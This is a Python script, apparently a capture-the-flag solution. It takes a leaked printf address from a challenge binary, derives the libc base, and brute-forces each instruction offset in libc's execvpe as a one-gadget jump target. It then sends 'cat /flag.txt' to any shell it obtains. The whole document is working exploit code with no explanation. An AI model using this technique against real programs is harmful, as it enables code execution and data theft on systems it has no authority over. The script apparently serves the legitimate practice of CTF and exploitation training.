from subprocess import Popen, PIPE, TimeoutExpired, run
import os
import re


def preexec():
    os.setgid(999)
    os.setuid(999)


def try_one_gadget(offset):
    with Popen(
        ["./chal"], stdin=PIPE, stdout=PIPE, stderr=PIPE, preexec_fn=preexec
    ) as proc:
        line = proc.stdout.readline().strip().decode()
        proc.stdout.read(len("Enter the address> "))
        printf_runtime_addr = int(line.split(" @ ")[1], 16)
        printf_offset = 0x60100
        base_addr = printf_runtime_addr - printf_offset
        proc.stdin.write(hex(base_addr + offset).encode() + b"\n")
        proc.stdin.write(b"cat /flag.txt\n")
        proc.stdin.write(b"exit\n")
        proc.stdin.flush()
        try:
            data, error = proc.communicate(timeout=1)
            print(f"{hex(offset)}: data:{data}, error:{error}")
        except TimeoutExpired:
            proc.kill()
            print(f"{hex(offset)}: timeout")


func_name = "execvpe"
print(f"Trying function: {func_name}")
result = run(
    [
        "objdump",
        "-j",
        ".text",
        "--disassemble=" + func_name,
        "/lib/x86_64-linux-gnu/libc.so.6",
    ],
    capture_output=True,
    text=True,
)

for line in result.stdout.splitlines():
    if m := re.match(r"   ([0-9a-f]+):", line):
        try_one_gadget(int(m.group(1), 16))
